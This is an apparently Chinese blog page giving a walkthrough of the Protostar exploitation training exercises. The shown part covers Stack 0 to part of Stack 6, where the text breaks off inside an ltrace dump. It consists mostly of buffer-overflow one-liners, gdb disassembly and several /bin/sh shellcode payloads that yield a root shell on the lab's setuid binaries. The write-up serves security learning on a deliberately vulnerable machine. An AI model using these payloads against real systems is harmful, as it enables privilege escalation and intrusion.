<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <!-- viewport-fit=cover is to support iPhone X rounded corners and notch in landscape-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=10, viewport-fit=cover">

      <title>LuckyDog | CSUwangj&#x27;s Blog</title>

      <!-- CSS -->
      <link rel="stylesheet" href="https://CSUwangj.github.io/css/lib/font-awesome.min.css">
      <link rel="stylesheet" href="https://CSUwangj.github.io/site.css">
      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Alegreya+Sans|Noto+Serif+SC">
      
<link rel="stylesheet" href="https://CSUwangj.github.io/custom.css">

      <!-- js -->
      <script type="text/javascript" charset="utf-8" src="https://CSUwangj.github.io/js/sidebar.js"></script>
      

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css" crossorigin="anonymous">
<script type="module">
import renderMathInElement from "https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.mjs";
const katex_config = {
  delimiters: [
    { left: "$$", right: "$$", display: true },
    { left: "$", right: "$", display: false },
  ],
  macros: {
    // Functions
    arccot: '\\operatorname{arccot}',
    arcsec: '\\operatorname{arcsec}',
    arccsc: '\\operatorname{arccsc}',
  }
}
renderMathInElement(document.body, katex_config);
</script>


      

      
      <link rel="alternate" type="application/rss+xml" title="RSS" href="https://CSUwangj.github.io/rss.xml">
      
      
      <link rel="icon" type="image/x-icon" href="https://CSUwangj.github.io/images/favicon.ico">
      

      
      
    </head>

    <body>
      
      
      <header name="header">
        <div>
          <div class="logo"><a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;">LuckyDog</a></div>
          <nav class="menu">
            
            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;" class="nav-item-home unselectable">
              <span><i class="fa-solid fa-house"></i> Home</span>
            </a>
            
            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;about" class="nav-item-about unselectable">
              <span><i class="fa-solid fa-user-circle"></i> About</span>
            </a>
            
            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;categories" class="nav-item-categories unselectable">
              <span><i class="fa-solid fa-book"></i> Categories</span>
            </a>
            
            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;tags" class="nav-item-tags unselectable">
              <span><i class="fa-solid fa-tags"></i> Tags</span>
            </a>
            
            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;archives" class="nav-item-archives unselectable">
              <span><i class="fa-solid fa-inbox"></i> Archives</span>
            </a>
            
            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;ZDaily" class="nav-item-dailychallenge unselectable">
              <span><i class="fa-solid fa-calendar-check"></i> DailyChallenge</span>
            </a>
            
            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;Webtools" class="nav-item-webtools unselectable">
              <span><i class="fa-solid fa-toolbox"></i> Webtools</span>
            </a>
            
            
          </nav>
        </div>
      </header>
      

      <main class="content container" name="main">
        <div class="content-wrapper">
          
  <div class="post">
    <h1 class="post-title">Exploit-Exercise_Protostar全攻略+解析</h1>
    <div class="post-meta">
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa-solid fa-calendar"></i></span>
        <span class="post-date">Posted on: </span>
        <time datetime=2018-07-22T14:46:15+08:00 title="post created">2018-07-22</time>
      
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa-solid fa-calendar-check"></i></span>
        <span class="modify-date">Posted modified: </span>
        <time datetime=2020-08-07T02:01:26.830854+08:00 title="post modified">2020-08-07</time>
      
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa-solid fa-folder"></i></span>
        <span class="in-category">In: </span>
          
            <a class="category" href="/category/WriteUp">WriteUp</a>
          
      
      <span class="post-meta-divider">|</span>
    </div>
    <div class="post-body">
      <p>目前进度：</p>
<ul>
<li><input disabled="" type="checkbox" checked=""/>
Stack 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 2</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 3</li>
<li><input disabled="" type="checkbox"/>
小结一：C/C++程序中的栈</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 4</li>
<li><input disabled="" type="checkbox"/>
小结二：EIP能好怎</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 5</li>
<li><input disabled="" type="checkbox"/>
小结三：shellcode</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 6</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 7</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 2</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 3</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 4</li>
<li><input disabled="" type="checkbox"/>
小结四：格式化字符串</li>
<li><input disabled="" type="checkbox" checked=""/>
Heap 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Heap 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Heap 2</li>
<li><input disabled="" type="checkbox" checked=""/>
Heap 3</li>
<li><input disabled="" type="checkbox" checked=""/>
Net 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Net 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Net 2</li>
<li><input disabled="" type="checkbox" checked=""/>
Final 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Final 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Final 2</li>
</ul>
<span id="continue-reading"></span><h1 id="stack-0">Stack 0</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a&#39;*65</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack0
</span><span style="color:#d0dfe6;">you</span><span> have changed the </span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">modified</span><span style="color:#516a88;">&#39;</span><span> variable
</span></code></pre>
<h1 id="stack-1">Stack 1</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a&#39;*64+&#39;dcba&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">xargs</span><span> ./stack1
</span><span style="color:#d0dfe6;">you</span><span> have correctly got the variable to the right value
</span></code></pre>
<h1 id="stack-2">Stack 2</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">GREENIE</span><span style="color:#748aa6;">=</span><span>`</span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a&#39;*64+&#39;\x0a\x0d\x0a\x0d&#39;</span><span style="color:#516a88;">&quot;</span><span>` ./stack2
</span></code></pre>
<h1 id="stack-3">Stack 3</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) disas win
</span><span style="color:#d0dfe6;">Dump</span><span> of assembler code for function win:
</span><span style="color:#d0dfe6;">0x08048424 </span><span style="color:#748aa6;">&lt;</span><span>win+0</span><span style="color:#748aa6;">&gt;</span><span>:     push   %</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x08048425 </span><span style="color:#748aa6;">&lt;</span><span>win+1</span><span style="color:#748aa6;">&gt;</span><span>:     mov    %</span><span style="color:#d0dfe6;">esp</span><span>,%</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x08048427 </span><span style="color:#748aa6;">&lt;</span><span>win+3</span><span style="color:#748aa6;">&gt;</span><span>:     sub    $</span><span style="color:#d0dfe6;">0</span><span>x18,%</span><span style="color:#d0dfe6;">esp
</span><span style="color:#d0dfe6;">0x0804842a </span><span style="color:#748aa6;">&lt;</span><span>win+6</span><span style="color:#748aa6;">&gt;</span><span>:     movl   $</span><span style="color:#d0dfe6;">0</span><span>x8048540,(%</span><span style="color:#d0dfe6;">esp</span><span>)
</span><span style="color:#d0dfe6;">0x08048431 </span><span style="color:#748aa6;">&lt;</span><span>win+13</span><span style="color:#748aa6;">&gt;</span><span>:    call   0x8048360 </span><span style="color:#748aa6;">&lt;</span><span>puts@plt</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">0x08048436 </span><span style="color:#748aa6;">&lt;</span><span>win+18</span><span style="color:#748aa6;">&gt;</span><span>:    leave
</span><span style="color:#d0dfe6;">0x08048437 </span><span style="color:#748aa6;">&lt;</span><span>win+19</span><span style="color:#748aa6;">&gt;</span><span>:    ret
</span><span style="color:#d0dfe6;">End</span><span> of assembler dump.
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a&#39;*64+&#39;\x23\x84\x04\x08&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack3
</span><span style="color:#d0dfe6;">calling</span><span> function pointer, jumping to 0x08048423
</span><span style="color:#d0dfe6;">code</span><span> flow successfully changed
</span></code></pre>
<h1 id="stack-4">Stack 4</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) disas main
</span><span style="color:#d0dfe6;">Dump</span><span> of assembler code for function main:
</span><span style="color:#d0dfe6;">0x08048408 </span><span style="color:#748aa6;">&lt;</span><span>main+0</span><span style="color:#748aa6;">&gt;</span><span>:    push   %</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x08048409 </span><span style="color:#748aa6;">&lt;</span><span>main+1</span><span style="color:#748aa6;">&gt;</span><span>:    mov    %</span><span style="color:#d0dfe6;">esp</span><span>,%</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x0804840b </span><span style="color:#748aa6;">&lt;</span><span>main+3</span><span style="color:#748aa6;">&gt;</span><span>:    and    $</span><span style="color:#d0dfe6;">0</span><span>xfffffff0,%</span><span style="color:#d0dfe6;">esp
</span><span style="color:#d0dfe6;">0x0804840e </span><span style="color:#748aa6;">&lt;</span><span>main+6</span><span style="color:#748aa6;">&gt;</span><span>:    sub    $</span><span style="color:#d0dfe6;">0</span><span>x50,%</span><span style="color:#d0dfe6;">esp
</span><span style="color:#d0dfe6;">0x08048411 </span><span style="color:#748aa6;">&lt;</span><span>main+9</span><span style="color:#748aa6;">&gt;</span><span>:    lea    0x10(%</span><span style="color:#d0dfe6;">esp</span><span>)</span><span style="color:#d0dfe6;">,%eax
</span><span style="color:#d0dfe6;">0x08048415 </span><span style="color:#748aa6;">&lt;</span><span>main+13</span><span style="color:#748aa6;">&gt;</span><span>:   mov    %</span><span style="color:#d0dfe6;">eax</span><span>,(%</span><span style="color:#d0dfe6;">esp</span><span>)
</span><span style="color:#d0dfe6;">0x08048418 </span><span style="color:#748aa6;">&lt;</span><span>main+16</span><span style="color:#748aa6;">&gt;</span><span>:   call   0x804830c </span><span style="color:#748aa6;">&lt;</span><span>gets@plt</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">0x0804841d </span><span style="color:#748aa6;">&lt;</span><span>main+21</span><span style="color:#748aa6;">&gt;</span><span>:   leave
</span><span style="color:#d0dfe6;">0x0804841e </span><span style="color:#748aa6;">&lt;</span><span>main+22</span><span style="color:#748aa6;">&gt;</span><span>:   ret
</span><span style="color:#d0dfe6;">End</span><span> of assembler dump.
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) disas win
</span><span style="color:#d0dfe6;">Dump</span><span> of assembler code for function win:
</span><span style="color:#d0dfe6;">0x080483f4 </span><span style="color:#748aa6;">&lt;</span><span>win+0</span><span style="color:#748aa6;">&gt;</span><span>:     push   %</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x080483f5 </span><span style="color:#748aa6;">&lt;</span><span>win+1</span><span style="color:#748aa6;">&gt;</span><span>:     mov    %</span><span style="color:#d0dfe6;">esp</span><span>,%</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x080483f7 </span><span style="color:#748aa6;">&lt;</span><span>win+3</span><span style="color:#748aa6;">&gt;</span><span>:     sub    $</span><span style="color:#d0dfe6;">0</span><span>x18,%</span><span style="color:#d0dfe6;">esp
</span><span style="color:#d0dfe6;">0x080483fa </span><span style="color:#748aa6;">&lt;</span><span>win+6</span><span style="color:#748aa6;">&gt;</span><span>:     movl   $</span><span style="color:#d0dfe6;">0</span><span>x80484e0,(%</span><span style="color:#d0dfe6;">esp</span><span>)
</span><span style="color:#d0dfe6;">0x08048401 </span><span style="color:#748aa6;">&lt;</span><span>win+13</span><span style="color:#748aa6;">&gt;</span><span>:    call   0x804832c </span><span style="color:#748aa6;">&lt;</span><span>puts@plt</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">0x08048406 </span><span style="color:#748aa6;">&lt;</span><span>win+18</span><span style="color:#748aa6;">&gt;</span><span>:    leave
</span><span style="color:#d0dfe6;">0x08048407 </span><span style="color:#748aa6;">&lt;</span><span>win+19</span><span style="color:#748aa6;">&gt;</span><span>:    ret
</span><span style="color:#d0dfe6;">End</span><span> of assembler dump.
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#267fb5;">echo </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">s=&#39;a&#39;*64\nfor i in range(0, 26):\n  s += chr(ord(&#39;a&#39;)+i)\nprint s</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">python
</span><span style="color:#516a88;">### run with this pattern input
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) r </span><span style="color:#748aa6;">&lt; </span><span style="color:#d0dfe6;">~</span><span>/stack4.txt
</span><span style="color:#d0dfe6;">Starting</span><span> program: /opt/protostar/bin/stack4 </span><span style="color:#748aa6;">&lt; </span><span style="color:#d0dfe6;">~</span><span>/stack4.txt
</span><span>
</span><span style="color:#d0dfe6;">Program</span><span> received signal SIGSEGV, Segmentation fault.
</span><span style="color:#d0dfe6;">0x706f6e6d</span><span> in </span><span style="color:#748aa6;">??</span><span> ()</span><span style="color:#d0dfe6;">#That</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">s what we need
</span><span style="color:#6ee2ff;">###
</span><span style="color:#6ee2ff;">$ python -c &quot;print </span><span style="color:#516a88;">&#39;</span><span style="color:#d0dfe6;">a</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">*0x4c+</span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\x</span><span style="color:#d0dfe6;">f4</span><span style="color:#4cbbff;">\x</span><span style="color:#d0dfe6;">83</span><span style="color:#4cbbff;">\x</span><span style="color:#d0dfe6;">04</span><span style="color:#4cbbff;">\x</span><span style="color:#d0dfe6;">08</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">&quot; | ./stack4
</span><span style="color:#6ee2ff;">code flow successfully changed
</span><span style="color:#6ee2ff;">Segmentation fault
</span></code></pre>
<h1 id="stack-5">Stack 5</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> (python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print  &#39;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&#39;+ (76-37)*&#39;a&#39;+&#39;\xa0\xfc\xff\xbf&#39;</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack5
</span><span style="color:#d0dfe6;">id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">1001</span><span>(</span><span style="color:#d0dfe6;">user</span><span>) gid=1001(user) </span><span style="color:#d0dfe6;">euid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) groups=0(root)</span><span style="color:#d0dfe6;">,1001</span><span>(user)
</span><span style="color:#d0dfe6;">whoami
</span><span style="color:#d0dfe6;">root
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span>(</span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\x89\xe5\xdb\xd2\xd9\x75\xf4\x59\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x41\x41&#39;+(76-68)*&#39;a&#39;+&#39;\xa0\xfc\xff\xbf&#39;</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack5
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> (python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#39;+(76-29)*&#39;\xcc&#39;+&#39;\xa0\xfc\xff\xbf&#39;</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack5
</span><span style="color:#d0dfe6;">id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">1001</span><span>(</span><span style="color:#d0dfe6;">user</span><span>) gid=1001(user) </span><span style="color:#d0dfe6;">euid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) groups=0(root)</span><span style="color:#d0dfe6;">,1001</span><span>(user)
</span><span style="color:#d0dfe6;">whoami
</span><span style="color:#d0dfe6;">root
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> (python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">print &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80&quot; + &quot;\xcc&quot;*(76-34) + &quot;\xa0\xfc\xff\xbf&quot;</span><span style="color:#516a88;">&#39;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack5
</span><span style="color:#d0dfe6;">Owned!!!
</span></code></pre>
<h1 id="stack-6">Stack 6</h1>
<h2 id="solution-1-duplicated-shellcode">solution 1: Duplicated Shellcode</h2>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;b&#39;*80</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">|</span><span style="color:#d0dfe6;">./stack6
</span><span style="color:#d0dfe6;">input</span><span> path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
</span><span style="color:#d0dfe6;">input</span><span> path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ▒
</span><span style="color:#d0dfe6;">Segmentation</span><span> fault (core dumped)
</span></code></pre>
<p>这时在dump出来的文件里可以发现输入的东西在别处出现了</p>
<p><img src="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/1532445422307.png" alt="Duplicated Shellcode" /></p>
<p><img src="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/1532445627447.png" alt="Duplicated Shellcode2" /></p>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> (python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print  &#39;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&#39;+ (80-37)*&#39;a&#39;+&#39;\x00\xe0\xfd\xb7&#39;</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack6
</span><span style="color:#d0dfe6;">input</span><span> path please: got path 1▒▒▒RRRT[S_▒/bin▒G//sh@u▒</span><span style="color:#748aa6;">;</span><span style="color:#d0dfe6;">1ɰ
</span><span>                                                        </span><span style="color:#d0dfe6;">̀aaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span style="color:#d0dfe6;">id
</span><span style="color:#d0dfe6;">uid</span><span>	=1001(user) </span><span style="color:#d0dfe6;">gid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">1001</span><span>(</span><span style="color:#d0dfe6;">user</span><span>) euid=0(root) </span><span style="color:#d0dfe6;">groups</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>),1001(user)
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> (python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#39;+(80-29)*&#39;\xcc&#39;+&#39;\x00\xe0\xfd\xb7&#39;</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack6
</span><span style="color:#d0dfe6;">input</span><span> path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒
</span><span>                                                </span><span style="color:#d0dfe6;">1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span style="color:#d0dfe6;">id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">1001</span><span>(</span><span style="color:#d0dfe6;">user</span><span>) gid=1001(user) </span><span style="color:#d0dfe6;">euid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) groups=0(root)</span><span style="color:#d0dfe6;">,1001</span><span>(user)
</span><span>
</span></code></pre>
<h3 id="xun-gen-jiu-di">寻根究底</h3>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;b&#39;*80</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">|</span><span style="color:#d0dfe6;">ltrace</span><span style="font-style:italic;color:#95cc5e;"> -S</span><span> ./stack6 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> b7fd
</span><span style="color:#d0dfe6;">SYS_brk</span><span>(NULL)                                         </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804a000
</span><span style="color:#d0dfe6;">SYS_fcntl64</span><span>(0, 1, 0, 0, 0xb7ffeff4)                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_fcntl64</span><span>(1, 1, 0, 1, 0xb7ffeff4)                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_fcntl64</span><span>(2, 1, 0, 2, 0xb7ffeff4)                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_access</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/suid-debug</span><span style="color:#516a88;">&quot;</span><span>, 00)                     </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">-2
</span><span style="color:#d0dfe6;">SYS_access</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/ld.so.nohwcap</span><span style="color:#516a88;">&quot;</span><span>, 00)                  </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">-2
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 8192, 3, 34,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)                         </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fe0000
</span><span style="color:#d0dfe6;">SYS_access</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/ld.so.preload</span><span style="color:#516a88;">&quot;</span><span>, 04)                  </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">-2
</span><span style="color:#d0dfe6;">SYS_open</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/ld.so.cache</span><span style="color:#516a88;">&quot;</span><span>, 0, 00)                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">3
</span><span style="color:#d0dfe6;">SYS_fstat64</span><span>(3, 0xbffff6d4, 0xb7ffeff4, 0xb7fff87c, 3) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 13796, 1, 2, 3)                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fdc000
</span><span style="color:#d0dfe6;">SYS_close</span><span>(3)                                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_access</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/ld.so.nohwcap</span><span style="color:#516a88;">&quot;</span><span>, 00)                  </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">-2
</span><span style="color:#d0dfe6;">SYS_open</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/lib/libc.so.6</span><span style="color:#516a88;">&quot;</span><span>, 0, 00)                     </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">3
</span><span style="color:#d0dfe6;">SYS_read</span><span>(3, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">\177ELF\001\001\001</span><span style="color:#516a88;">&quot;</span><span>, 512)               </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">512
</span><span style="color:#d0dfe6;">SYS_fstat64</span><span>(3, 0xbffff720, 0xb7ffeff4, 0xb7fdf21d, 0x8048268) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
